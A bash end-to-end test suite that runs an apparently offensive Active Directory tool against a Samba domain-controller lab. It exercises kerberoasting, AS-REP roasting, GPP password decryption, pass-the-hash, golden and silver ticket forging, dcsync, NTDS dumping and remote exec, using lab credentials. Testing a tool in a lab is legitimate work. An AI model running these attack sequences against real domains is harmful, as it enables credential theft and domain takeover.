#!/usr/bin/env bash
# anvil e2e against the Samba AD DC lab. Plain output, no color deps.
# Exit 1 if any assertion fails.
set -uo pipefail

ANVIL=/opt/anvil/anvil-linux-amd64
PASS=0
FAIL=0
declare -a FAILED=()

pass() { PASS=$((PASS + 1)); echo "PASS  $*"; }
fail() {
	FAIL=$((FAIL + 1))
	FAILED+=("$1")
	echo "FAIL  $1"
}

# assert_re <desc> <ere-pattern> <haystack>
assert_re() {
	if grep -qE -- "$2" <<<"$3"; then pass "$1"; else fail "$1 (missing: /$2/)"; fi
}

# assert_fx <desc> <fixed-string> <haystack>
assert_fx() {
	if grep -qF -- "$2" <<<"$3"; then pass "$1"; else fail "$1 (missing: '$2')"; fi
}

# assert_fxi <desc> <fixed-string> <haystack> (case-insensitive)
assert_fxi() {
	if grep -qiF -- "$2" <<<"$3"; then pass "$1"; else fail "$1 (missing: '$2')"; fi
}

START=$(date +%s)

echo "== [1/14] readiness: waiting for dc:445 and dc:389 (max 180s) =="
ready=0
for _ in $(seq 1 60); do
	if (: </dev/tcp/dc/445) 2>/dev/null && (: </dev/tcp/dc/389) 2>/dev/null; then
		ready=1
		break
	fi
	sleep 3
done
if [ "$ready" -ne 1 ]; then
	fail "dc readiness (445/389 never came up)"
	echo "FAIL  aborting: target never became ready"
	exit 1
fi
pass "dc ready on 445 + 389"

echo "== [2/14] anvil scan dc (human) =="
SCAN_OUT=$($ANVIL scan dc 2>&1)
echo "$SCAN_OUT"
assert_re "scan: 445/tcp open" '445/tcp.*open' "$SCAN_OUT"
assert_re "scan: 389/tcp open" '389/tcp.*open' "$SCAN_OUT"
assert_re "scan: 88/tcp open" '88/tcp.*open' "$SCAN_OUT"
assert_fx "scan: SMB section dialect" "dialect" "$SCAN_OUT"
assert_fx "scan: SMB section signing" "signing" "$SCAN_OUT"
assert_re "scan: LDAP naming ctx" 'naming ctx.*DC=lab,DC=local' "$SCAN_OUT"
assert_fxi "scan: HINTS domain controller" "domain controller" "$SCAN_OUT"
assert_fx "scan: RPC endpoints line" "endpoints" "$SCAN_OUT"

echo "== [3/14] anvil scan dc --json =="
JSON_OUT=$($ANVIL scan dc --json 2>&1)
assert_fx "scan --json: target" '"target": "dc"' "$JSON_OUT"
assert_fx "scan --json: dialect key" '"dialect"' "$JSON_OUT"

echo "== [4/14] anvil connect (password) =="
CONN_OUT=$($ANVIL connect --host dc -u alice -p 'AlicePass#2026' -d LAB <<'EOF'
shares
sessions
users
groups
members Domain Admins
services
loggedon
reg query HKLM
reg query HKLM\Bogus\Key
kerberoast
asrep
addcomputer ANVPC
gpp
exec hostname
use LABSHARE
ls
cd docs
pwd
get note.txt /tmp/dl-note.txt
get ..\hello.txt /tmp/dl-hello.txt
cd ..
put /etc/hostname runner-was-here.txt
mkdir anvil-dir
put /etc/hostname anvil-dir/staged.txt
rename anvil-dir/staged.txt anvil-dir/renamed.txt
cat anvil-dir/renamed.txt
rm anvil-dir/renamed.txt
rmdir anvil-dir
exit
EOF
)
CONN_RC=$?
echo "$CONN_OUT"
[ "$CONN_RC" -eq 0 ] && pass "connect: exit 0" || fail "connect: exit 0 (got $CONN_RC)"
assert_fx "connect: shares lists LABSHARE" "LABSHARE" "$CONN_OUT"
assert_fx "shares: LABSHARE is READ, WRITE for alice" "READ, WRITE" "$CONN_OUT"
assert_re "shares: netlogon is READ ONLY" 'netlogon\s+READ ONLY' "$CONN_OUT"
assert_fx "shares: IPC$ marked pipe share" "pipe share" "$CONN_OUT"
assert_fx "connect: ls shows hello.txt" "hello.txt" "$CONN_OUT"
assert_fx "connect: ls shows blob.bin" "blob.bin" "$CONN_OUT"
assert_fx "connect: ls shows docs/" "docs/" "$CONN_OUT"
assert_fx 'connect: pwd after cd docs' 'LABSHARE:\docs' "$CONN_OUT"

# --- enumeration (same session, no share needed) ---
# Samba reality: SAMR works for any authenticated user; srvsvc
# NetrSessionEnum level 10 is denied (0x00000005 for alice, 0x0000007c
# INVALID_LEVEL for admins) — assert the themed error, not Windows behavior.
assert_fx "enum: users lists alice" "alice" "$CONN_OUT"
assert_re "enum: users lists Administrator with RID 500" '500\s+Administrator' "$CONN_OUT"
assert_fx "enum: sessions denied cleanly on Samba" "access denied" "$CONN_OUT"
assert_fx "enum: groups lists Domain Admins" "Domain Admins" "$CONN_OUT"
assert_fx "enum: members of Domain Admins lists Administrator" "Administrator" "$CONN_OUT"
# Samba svcctl denies non-admin at OpenSCManager (0x00000005).
assert_fx "services: denied for non-admin on Samba" "access denied" "$CONN_OUT"
# Samba's wkssvc binds but lacks NetrWkstaUserEnum (opnum 2): nca_s_op_rng_error.
assert_fx "loggedon: wkssvc opnum unimplemented on Samba" "not supported on this server" "$CONN_OUT"
# Samba winreg: OpenLocalMachine faults with EPT_S_NOT_REGISTERED; a bogus
# key path gets an app-level 0x00000002 instead.
assert_fx "reg: winreg backend fault on Samba" "not supported on this server (RPC op not registered)" "$CONN_OUT"
assert_fx "reg: bogus key path errors cleanly" "0x00000002" "$CONN_OUT"
# Provision sets "ldap server require strong auth = no" (the Windows-DC
# default), so the roast's LDAP SPN lookup now works against Samba. The TGS
# half still fails: the SMB session's NTLM challenge only carries the
# NetBIOS domain (LAB), and gokrb5's strict crealm check rejects the KDC's
# LAB.LOCAL reply. (On Windows the challenge carries the DNS tree and the
# full flow succeeds.)
assert_fx "kerberoast: SPN lookup works over simple LDAP bind" "requesting service tickets from KDC" "$CONN_OUT"
assert_fx "kerberoast: TGS fails on NetBIOS realm (CRealm mismatch)" "CRealm in response does not match" "$CONN_OUT"
# Samba doesn't grant regular users machine-account creation by default.
assert_fx "addcomputer: denied for alice on Samba" "no right to create a machine account" "$CONN_OUT"
# GPP fixture planted at provision: Groups.xml decrypts to Lab!GPP#2026.
assert_fx "gpp: finds and decrypts the cpassword" "Lab!GPP#2026" "$CONN_OUT"
assert_fx "gpp: names the source file" "Groups.xml" "$CONN_OUT"
# AS-REP roasting works end-to-end on this lab. Samba's Heimdal KDC gates
# no-preauth AS on require_preauth_p = config || client || krbtgt-server —
# provision flips all three ([kdc] require-preauth = no in
# /etc/samba/krb5.conf, UF_DONT_REQ_PREAUTH on alice and on krbtgt; a
# Windows DC needs only the account flag). See testenv/dc/provision.sh.
# Assert the real hashcat line for alice.
assert_re "asrep: hashcat line for alice" '\$krb5asrep\$23\$.*alice' "$CONN_OUT"
# krbtgt is flagged too (required — it is the AS-REQ's server entry), so it
# shows up in the DONT_REQ_PREAUTH scan; its AS-REP fails because krbtgt
# holds AES keys only while the roast offers rc4-hmac (etype 23).
assert_fx "asrep: krbtgt flagged, no rc4 client key (benign warning)" "AS-REP for krbtgt failed" "$CONN_OUT"
# Samba has no ITaskSchedulerService (no atsvc pipe); exec must fail with a
# clean themed message, no panic, and the session must survive. (On real
# Windows the task registers and runs.)
assert_fx "exec: tsch unavailable on Samba, clean denial" "task scheduler RPC not available" "$CONN_OUT"

dl_note=$(sha256sum /tmp/dl-note.txt 2>/dev/null | cut -d' ' -f1)
vf_note=$(sha256sum /verify/docs/note.txt 2>/dev/null | cut -d' ' -f1)
if [ -n "$dl_note" ] && [ "$dl_note" = "$vf_note" ]; then
	pass "connect: get note.txt round-trip sha256"
else
	fail "connect: get note.txt round-trip sha256 ($dl_note != $vf_note)"
fi

dl_hello=$(sha256sum /tmp/dl-hello.txt 2>/dev/null | cut -d' ' -f1)
vf_hello=$(sha256sum /verify/hello.txt 2>/dev/null | cut -d' ' -f1)
if [ -n "$dl_hello" ] && [ "$dl_hello" = "$vf_hello" ]; then
	pass 'connect: get ..\hello.txt round-trip sha256'
else
	fail "connect: get ..\\hello.txt round-trip sha256 ($dl_hello != $vf_hello)"
fi

if [ -f /verify/runner-was-here.txt ]; then
	pass "connect: put runner-was-here.txt landed in share"
else
	fail "connect: put runner-was-here.txt landed in share"
fi

# --- file-management sequence (same session, LABSHARE root) ---
assert_fx "filemgmt: mkdir confirmation" "created anvil-dir" "$CONN_OUT"
assert_fx "filemgmt: put into subdir" "anvil-dir/staged.txt" "$CONN_OUT"
assert_fx "filemgmt: rename confirmation" "renamed anvil-dir/staged.txt -> anvil-dir/renamed.txt" "$CONN_OUT"
RUNNER_HOST=$(cat /etc/hostname)
assert_fx "filemgmt: cat shows uploaded content" "$RUNNER_HOST" "$CONN_OUT"
assert_fx "filemgmt: rm confirmation" "deleted anvil-dir/renamed.txt" "$CONN_OUT"
assert_fx "filemgmt: rmdir confirmation" "deleted anvil-dir" "$CONN_OUT"
if [ ! -e /verify/anvil-dir ]; then
	pass "filemgmt: anvil-dir lifecycle verified on disk (/verify)"
else
	fail "filemgmt: /verify/anvil-dir still exists after rm+rmdir"
fi

echo "== [5/14] anvil connect (pass-the-hash) =="
NTHASH=$(tr -d '[:space:]' </state/alice.nthash)
if [ -z "$NTHASH" ]; then
	fail "pth: /state/alice.nthash is empty"
else
	PTH_OUT=$($ANVIL connect --host dc -u alice -d LAB --hashes ":$NTHASH" <<'EOF'
use LABSHARE
ls
kerberoast
exit
EOF
	)
	PTH_RC=$?
	echo "$PTH_OUT"
	[ "$PTH_RC" -eq 0 ] && pass "pth: exit 0" || fail "pth: exit 0 (got $PTH_RC)"
	assert_fx "pth: ls shows seed files" "hello.txt" "$PTH_OUT"
	# Samba drops goldap's NTLM bind — clean themed error, session survives.
	assert_fx "pth: kerberoast NTLM bind denied on Samba" "NTLM bind failed" "$PTH_OUT"
fi

echo "== [6/14] anvil connect (kerberos ccache) =="
# Mint alice's TGT against the lab KDC, map the FQDN to the container IP
# (no lab DNS), then connect with the ccache. Realm must be DNS-form
# (LAB.LOCAL) — the ccache realm drives the exchange.
DCIP=$(getent hosts dc | awk '{print $1}')
grep -q "dc01.lab.local" /etc/hosts || echo "$DCIP dc01.lab.local" >>/etc/hosts
GETTGT_OUT=$(/opt/bin/getTGT-linux-amd64 -dc-ip "$DCIP" -outputfile /tmp/alice.ccache 'LAB.LOCAL/alice:AlicePass#2026@dc01.lab.local' 2>&1)
GETTGT_RC=$?
echo "$GETTGT_OUT"
if [ "$GETTGT_RC" -eq 0 ] && [ -s /tmp/alice.ccache ]; then
	pass "krb: getTGT minted ccache"
else
	fail "krb: getTGT minted ccache (rc=$GETTGT_RC)"
fi

KRB_OUT=$(KRB5CCNAME=/tmp/alice.ccache $ANVIL connect --host dc01.lab.local -k -u alice -d LAB.LOCAL <<'EOF'
shares
users
exit
EOF
)
KRB_RC=$?
echo "$KRB_OUT"
[ "$KRB_RC" -eq 0 ] && pass "krb: connect exit 0" || fail "krb: connect exit 0 (got $KRB_RC)"
assert_fx 'krb: connected as LAB.LOCAL\alice' 'connected dc01.lab.local as LAB.LOCAL\alice' "$KRB_OUT"
assert_fx "krb: shares lists LABSHARE" "LABSHARE" "$KRB_OUT"
assert_fx "krb: samr users works over kerberos" "Administrator" "$KRB_OUT"

echo "== [7/14] anvil ticket (golden ticket) =="
# Forge a TGT from the krbtgt NT hash extracted at provision, then attempt
# to connect with it as Administrator (the /etc/hosts entry for
# dc01.lab.local was added in [6/10]). Known Samba blockers (see
# provision.sh notes): this Samba's KDC holds no RC4 krbtgt key (RC4 forge
# → KRB_AP_ERR_BADKEYVER) and re-parses the PAC on TGS, rejecting
# gopacket's forged PAC LOGON_INFO (KRB_ERR_GENERIC). So here we assert
# Samba's reality (clean rejection); the successful golden-ticket loop is
# verified against the real Windows DC, where the KDC accepts the forged
# TGT and anvil runs commands as the forged identity.
KRBTGT_NT=$(tr -d '[:space:]' </state/krbtgt.nthash)
DOMAIN_SID=$(tr -d '[:space:]' </state/domain.sid)
if [ -z "$KRBTGT_NT" ] || [ -z "$DOMAIN_SID" ]; then
	fail "golden: /state/krbtgt.nthash or /state/domain.sid missing/empty"
else
	assert_re "golden: domain.sid format (S-1-5-21-x-y-z, no RID)" '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+$' "$DOMAIN_SID"

	TICKET_OUT=$($ANVIL ticket -krbtgt "$KRBTGT_NT" -domain lab.local -domain-sid "$DOMAIN_SID" -user Administrator -out /tmp/forged.ccache 2>&1)
	TICKET_RC=$?
	echo "$TICKET_OUT"
	if [ "$TICKET_RC" -eq 0 ] && [ -s /tmp/forged.ccache ]; then
		pass "golden: anvil ticket wrote ccache"
	else
		fail "golden: anvil ticket wrote ccache (rc=$TICKET_RC)"
	fi

	# The golden connect CANNOT succeed on this Samba (no RC4 krbtgt key,
	# and Samba re-parses gopacket's forged PAC). The full loop — dcsync →
	# forge → connect -k → exec — is verified against the real Windows DC
	# (DC accepted the forged TGT as Administrator). Here we assert Samba's
	# reality: the forged ticket is presented and the KDC rejects it with a
	# clean kerberos error, session exit non-zero, no panic.
	GOLD_OUT=$(KRB5CCNAME=/tmp/forged.ccache $ANVIL connect --host dc01.lab.local -k -u Administrator -d LAB.LOCAL <<'EOF'
shares
exit
EOF
	)
	GOLD_RC=$?
	echo "$GOLD_OUT"
	[ "$GOLD_RC" -ne 0 ] && pass "golden: Samba KDC rejects forged TGT (non-zero exit)" || fail "golden: expected rejection, got rc=0"
	assert_re "golden: clean kerberos error (no panic)" 'error: .*(KRB|kerberos|ticket|BADKEYVER|GENERIC)' "$GOLD_OUT"
fi

echo "== [8/14] anvil ticket (silver ticket) =="
# Forge a service ticket for cifs/dc01.lab.local from the DC machine
# account's NT hash extracted at provision (the /etc/hosts entry for
# dc01.lab.local was added in [6/10]). Samba reality, probed against this
# lab: the forge succeeds, but smbd refuses the SMB session setup with
# NT_STATUS_LOGON_FAILURE — and a ticket forged with a WRONG key gets the
# identical refusal, so Samba gives no oracle about the exact stage. What
# is verified: unlike krbtgt's AES-only entry, DC01$ holds an arcfour key
# equal to its NT hash in secrets.keytab (for DC01$ and cifs/dc01.lab.local
# alike), so the forged ticket is encrypted under the correct service key;
# the blocker is consistent with the PAC re-validation strictness that
# rejects the golden ticket's PAC at TGS ([7/10]) — a silver ticket's KDC
# checksum is signed with the service key, not krbtgt's. Assert that
# reality below (clean refusal, no panic); the working silver loop —
# forge → connect -k → exec — is verified against the real Windows DC.
DC01_NT=$(tr -d '[:space:]' </state/dc01.nthash)
DOMAIN_SID=$(tr -d '[:space:]' </state/domain.sid)
if [ -z "$DC01_NT" ] || [ -z "$DOMAIN_SID" ]; then
	fail "silver: /state/dc01.nthash or /state/domain.sid missing/empty"
else
	TICKET_OUT=$($ANVIL ticket -nthash "$DC01_NT" -spn cifs/dc01.lab.local -domain lab.local -domain-sid "$DOMAIN_SID" -user Administrator -out /tmp/silver.ccache 2>&1)
	TICKET_RC=$?
	echo "$TICKET_OUT"
	if [ "$TICKET_RC" -eq 0 ] && [ -s /tmp/silver.ccache ]; then
		pass "silver: anvil ticket wrote ccache"
	else
		fail "silver: anvil ticket wrote ccache (rc=$TICKET_RC)"
	fi

	SILVER_OUT=$(KRB5CCNAME=/tmp/silver.ccache $ANVIL connect --host dc01.lab.local -k -u Administrator -d LAB.LOCAL <<'EOF'
shares
exit
EOF
	)
	SILVER_RC=$?
	echo "$SILVER_OUT"
	# Observed on this lab: exit 1 with a themed error naming the logon
	# failure, no panic — the forged ticket is presented at SMB session
	# setup and refused (identical refusal with a wrong key; Samba gives
	# no oracle). The assert matches the stable substring: the message
	# wrapper around "logon failure" has varied across builds.
	if [ "$SILVER_RC" -ne 0 ] && ! grep -qi -e panic -e goroutine <<<"$SILVER_OUT"; then
		pass "silver: Samba refuses forged service ticket (non-zero exit, no panic)"
	else
		fail "silver: expected clean rejection, got rc=$SILVER_RC"
	fi
	assert_fx "silver: session setup refused (logon failure)" "logon failure" "$SILVER_OUT"
fi

echo "== [9/14] anvil getst (S4U2Self/Proxy) =="
# S4U2Self works on Samba; S4U2Proxy is denied because no RBCD is
# configured (Samba marks the attribute system-only, so it can't be set in
# this lab). Assert that reality: self-leg succeeds, proxy-leg gets a clean
# themed denial, nonzero exit, no panic.
DCIP=$(getent hosts dc | awk '{print $1}')
GETST_OUT=$($ANVIL getst -spn HTTP/alice.lab.local -impersonate Administrator -u alice -p 'AlicePass#2026' -d LAB.LOCAL --dc-ip "$DCIP" 2>&1)
GETST_RC=$?
echo "$GETST_OUT"
assert_fx "getst: S4U2Self succeeds on Samba" "Requesting S4U2self" "$GETST_OUT"
[ "$GETST_RC" -ne 0 ] && pass "getst: S4U2Proxy denied without RBCD (nonzero exit)" || fail "getst: expected proxy denial, got rc=0"
assert_fx "getst: themed delegation denial" "delegation not allowed" "$GETST_OUT"

echo "== [10/14] anvil connect (admin services) =="
# As admin, Samba's svcctl actually enumerates its small synthetic service
# list (Spooler/NETLOGON/RemoteRegistry/WINS) — assert that reality.
SVC_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
services
reg save HKLM C:\Windows\Temp\hklm.save
reg save HKLM\SAM Temp\sam.save
samdump
lsadump
dpapi
dcsync
adenum users
adenum computers
adenum delegation
adenum laps
rbcd get dc01$
addcomputer ANVRB -pass Lab!PC#2026
rbcd set ANVRB$ alice
delcomputer ANVRB
exit
EOF
)
SVC_RC=$?
echo "$SVC_OUT"
[ "$SVC_RC" -eq 0 ] && pass "services (admin): exit 0" || fail "services (admin): exit 0 (got $SVC_RC)"
assert_fx "services (admin): Samba service list appears" "NETLOGON" "$SVC_OUT"
# Samba's winreg writes POSIX-side, so a drive-letter path fails with
# ERROR_BAD_PATHNAME (0xa1); relative paths are rejected client-side.
assert_fx "reg save (admin): drive path rejected server-side on Samba" "failed: 0x000000a1" "$SVC_OUT"
assert_fx "reg save: relative path rejected client-side" "must be an absolute Windows path" "$SVC_OUT"
# Samba has no ADMIN$ share, so samdump stops at the share switch with a
# themed error (no SAM hive exists to save anyway).
assert_fx "samdump: clean denial on Samba (no ADMIN$)" "network name not found on the server" "$SVC_OUT"
assert_fx "lsadump: clean denial on Samba (no ADMIN$)" "network name not found on the server" "$SVC_OUT"
assert_fx "dpapi: clean denial on Samba (no ADMIN$)" "network name not found on the server" "$SVC_OUT"
# Samba's DRSUAPI completes the full flow (epm, bind, DsBind, GetNCChanges)
# but returns zero credential-bearing objects — identical to gopacket's own
# secretsdump -just-dc against the same lab.
assert_fx "dcsync: DRS channel opens" "opening DRS channel" "$SVC_OUT"
assert_fx "dcsync: Samba returns zero credential objects" "no accounts returned" "$SVC_OUT"
# adenum runs one transient LDAP simple bind per mode (allowed by
# provision). Reality check: delegation can never hit (none) against a DC —
# the DC's own machine account is TRUSTED_FOR_DELEGATION by default (Samba
# mirrors Windows here: DC01$ UAC 0x82000), so it always lists as
# unconstrained. laps does hit (none): stock Samba has no LAPS schema or
# ms-Mcs-AdmPwd attributes.
assert_fx "adenum users: lists alice" "alice" "$SVC_OUT"
assert_re "adenum users: lists Administrator (table row)" '^  Administrator\s' "$SVC_OUT"
assert_re "adenum computers: lists the DC (table row)" '^  DC01\$\s+dc01\.lab\.local' "$SVC_OUT"
assert_re "adenum delegation: DC unconstrained (TRUSTED_FOR_DELEGATION default)" '^  DC01\$\s+unconstrained' "$SVC_OUT"
assert_fx "adenum laps: (none) on the stock lab (no LAPS schema)" "(none)" "$SVC_OUT"
# Samba marks msDS-AllowedToActOnBehalfOfOtherIdentity system-only: reads
# work (empty), writes are refused with a clean themed error.
assert_fx 'rbcd get: empty on the DC' 'dc01$ has no RBCD entries' "$SVC_OUT"
assert_fx "rbcd set: write refused on Samba (system-only attribute)" "can only be modified as system" "$SVC_OUT"

echo "== [11/14] anvil connect (changepasswd, admin reset) =="
# Admin reset: replace alice's unicodePwd, prove the new password
# authenticates, then restore her original password so the lab stays
# deterministic for reruns (earlier sections already used the original).
# Samba's LDAPS cert has a negative serial number that Go's x509 parser
# rejects, so the write is expected to fall back to plain LDAP (allowed by
# the lab's "ldap server require strong auth = no"); assert the outcome,
# not the channel. Change-with-old is NOT exercised here — see README.
CHPW_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
changepasswd alice 'NewPass#2026'
exit
EOF
)
CHPW_RC=$?
echo "$CHPW_OUT"
[ "$CHPW_RC" -eq 0 ] && pass "changepasswd: reset exit 0" || fail "changepasswd: reset exit 0 (got $CHPW_RC)"
assert_fx "changepasswd: reset reports success" "password changed for alice" "$CHPW_OUT"

CHPW2_OUT=$($ANVIL connect --host dc -u alice -p 'NewPass#2026' -d LAB <<'EOF'
shares
exit
EOF
)
CHPW2_RC=$?
echo "$CHPW2_OUT"
[ "$CHPW2_RC" -eq 0 ] && pass "changepasswd: new password authenticates (exit 0)" || fail "changepasswd: new password authenticates (got $CHPW2_RC)"
assert_fx "changepasswd: new-password session lists shares" "LABSHARE" "$CHPW2_OUT"

CHPW3_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
changepasswd alice 'AlicePass#2026'
exit
EOF
)
echo "$CHPW3_OUT"
assert_fx "changepasswd: alice's original password restored" "password changed for alice" "$CHPW3_OUT"

echo "== [12/14] anvil connect (ntdsdump, admin) =="
# ntdsdump extracts domain hashes offline: VSS-snapshot the DC (vssadmin via
# TSCH exec as SYSTEM), pull ntds.dit + the SYSTEM hive out of the shadow
# over C$, then parse the ESE database locally. This Samba lab has none of
# that: no atsvc pipe (same TSCH denial as `exec` in [4/14]), no C$/ADMIN$
# shares, and no ntds.dit at all. Assert the command fails with a clean
# themed error (no panic) and the session survives — a following command
# still works and exit is 0. (On a real Windows DC the snapshot, download,
# and offline parse produce secretsdump-format hashes.)
NTDS_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
ntdsdump
shares
exit
EOF
)
NTDS_RC=$?
echo "$NTDS_OUT"
[ "$NTDS_RC" -eq 0 ] && pass "ntdsdump: session survives failed dump (exit 0)" || fail "ntdsdump: session survives failed dump (got rc=$NTDS_RC)"
assert_fx "ntdsdump: themed error on Samba" "error:" "$NTDS_OUT"
assert_re "ntdsdump: failure names the missing capability (no VSS/TSCH/C\$)" 'task scheduler RPC not available|network name not found on the server|[Vv][Ss][Ss]|vssadmin|shadow|ntds\.dit' "$NTDS_OUT"
assert_fx "ntdsdump: session still usable after failure (shares works)" "LABSHARE" "$NTDS_OUT"
if grep -qi -e panic -e goroutine <<<"$NTDS_OUT"; then
	fail "ntdsdump: panic/goroutine dump in output"
else
	pass "ntdsdump: no panic"
fi

echo "== [13/14] anvil connect (addcomputer lifecycle) =="
# Full lifecycle as admin: SAMR create + LDAP attrs, visible in adenum,
# then LDAP delete, gone.
ADDC_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
addcomputer ANVPC -pass Lab!PC#2026
adenum computers
exit
EOF
)
ADDC_RC=$?
echo "$ADDC_OUT"
[ "$ADDC_RC" -eq 0 ] && pass "addcomputer: exit 0" || fail "addcomputer: exit 0 (got $ADDC_RC)"
assert_fx "addcomputer: created ANVPC" 'created ANVPC$' "$ADDC_OUT"
assert_fx "addcomputer: ANVPC appears in adenum" "ANVPC" "$ADDC_OUT"

DELC_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
delcomputer ANVPC
adenum computers
exit
EOF
)
DELC_RC=$?
echo "$DELC_OUT"
[ "$DELC_RC" -eq 0 ] && pass "delcomputer: exit 0" || fail "delcomputer: exit 0 (got $DELC_RC)"
if grep -qF "ANVPC.lab.local" <<<"$DELC_OUT"; then
	fail "delcomputer: ANVPC still present after delete"
else
	pass "delcomputer: ANVPC gone after delete"
fi

echo "== [14/15] anvil connect (null session) =="
# Samba AD DC (default restrict anonymous = 0) ACCEPTS anonymous session
# setup and even anonymous srvsvc share enumeration, but tree-connects to a
# non-guest share are denied. Assert that reality: session establishes,
# `use LABSHARE` is denied with a themed error, no panic, clean exit.
NULL_OUT=$(printf 'use LABSHARE\nexit\n' | $ANVIL connect --host dc 2>&1)
NULL_RC=$?
echo "$NULL_OUT"
assert_fx "null session: establishes (themed note)" "attempting null session" "$NULL_OUT"
assert_fx "null session: tree connect denied" "access denied" "$NULL_OUT"
if [ "$NULL_RC" -eq 0 ] && ! grep -qi -e panic -e goroutine <<<"$NULL_OUT"; then
	pass "null session: clean handling, exit 0, no panic"
else
	fail "null session: unexpected rc=$NULL_RC or panic in output"
fi

echo "== [15/15] anvil connect (tier-1/2 features on Samba) =="
# The tier-1/2 command set against the Samba lab. Samba reality here is
# richer than expected: dacledit/owneredit/samadd/samdel/lookupsid WORK
# (LDAP SD ops + SAMR aliases + LSARPC are implemented), while the exec
# family and WMI/DCOM are cleanly refused (no ADMIN$, no DCOM/WMI, and
# dMSA needs a 2025 schema). sampasswd fails on policy — NewPass#2026 is
# in alice's history from section 11. All mutations are self-reverting
# (grant+revoke, add+del). Assert that reality; verified against a real
# Windows DC is where these features' success paths live.
T12_OUT=$($ANVIL connect --host dc -u Administrator -p 'Lab!Admin#2026' -d LAB <<'EOF'
psexec whoami
wmiquery SELECT Name FROM Win32_Service
wmiexec whoami
dcomexec whoami
dacledit alice -p alice -grant genericall
dacledit alice -p alice -revoke
owneredit alice
samadd "Domain Guests" alice
samdel "Domain Guests" alice
sampasswd alice NewPass#2026 AlicePass#2026
lookupsid 500 505
badsuccessor enum
raisechild 31d6cfe0d16ae931b73c59d7e0c089c0
shares
exit
EOF
)
T12_RC=$?
echo "$T12_OUT"
[ "$T12_RC" -eq 0 ] && pass "tier1/2: session survives all new commands (exit 0)" || fail "tier1/2: session survives (got $T12_RC)"
assert_fx "psexec: denied on Samba (no ADMIN\$)" "network name not found" "$T12_OUT"
assert_fx "wmiquery: denied on Samba (no DCOM/WMI)" "not supported on this server" "$T12_OUT"
assert_fx "wmiexec: denied on Samba" "not supported on this server" "$T12_OUT"
assert_fx "dcomexec: denied on Samba" "network name not found" "$T12_OUT"
assert_fx "dacledit: grant works on Samba" "added 1 ACE(s): alice gets genericall on alice" "$T12_OUT"
assert_fx "dacledit: revoke works on Samba" "removed 1 ACE(s) for alice on alice" "$T12_OUT"
assert_fx "owneredit: reads owner on Samba" "Domain Admins" "$T12_OUT"
assert_fx "samadd: works on Samba" "alice added to Domain Guests" "$T12_OUT"
assert_fx "samdel: works on Samba" "alice removed from Domain Guests" "$T12_OUT"
assert_fx "sampasswd: policy rejection themed (history from section 11)" "password rejected by domain policy" "$T12_OUT"
assert_fx "lookupsid: resolves lab RID 500" "LAB\\Administrator" "$T12_OUT"
assert_fx "badsuccessor: clean no-schema denial" "no dMSA schema" "$T12_OUT"
assert_fx "raisechild: clean single-domain refusal" "not a child domain" "$T12_OUT"

END=$(date +%s)
echo "== summary =="
echo "passed: $PASS  failed: $FAIL  ($((END - START))s)"
if [ "$FAIL" -gt 0 ]; then
	printf 'failed assertion: %s\n' "${FAILED[@]}"
	exit 1
fi
echo "PASS $PASS/$((PASS + FAIL))"
exit 0
